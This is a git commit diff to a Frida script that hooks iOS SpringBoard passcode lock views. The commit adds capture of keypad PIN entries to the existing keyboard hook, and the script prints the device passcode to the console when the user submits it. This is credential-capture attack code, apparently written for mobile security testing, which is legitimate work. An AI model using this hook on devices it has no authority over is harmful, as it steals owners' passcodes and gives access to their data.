211112cbe8bda2ae7c3afb7f2a67b3db56bbee41
Quentin Kaiser <quentin@gremwell.com>
2020-05-01 12:14:43 +0200

    Add support for PIN passcode entry.

--- ios_springboard_passcode.js
+++ ios_springboard_passcode.js
@@ -8,8 +8,22 @@
 *
 */
 var device_passcode = "";
-var passcode = ObjC.classes.SBUIPasscodeLockViewWithKeyboard["- passcode"];
-Interceptor.attach(passcode.implementation, {
+
+var keypad_passcode = ObjC.classes.SBUIPasscodeLockViewWithKeypad["- passcode"];
+Interceptor.attach(keypad_passcode.implementation, {
+    onLeave: function(retval) {
+        var cur_passcode = new ObjC.Object(retval).toString();
+        if(cur_passcode.length > 0){
+            device_passcode = cur_passcode;
+        } else {
+            // user pressed submit, time to print out the passcode
+            console.log("[!] Device passcode is " + device_passcode);
+        }
+    }
+});
+
+var keyboard_passcode = ObjC.classes.SBUIPasscodeLockViewWithKeyboard["- passcode"];
+Interceptor.attach(keyboard_passcode.implementation, {
     onLeave: function(retval) {
         var cur_passcode = new ObjC.Object(retval).toString();
         if(cur_passcode.length > 0){
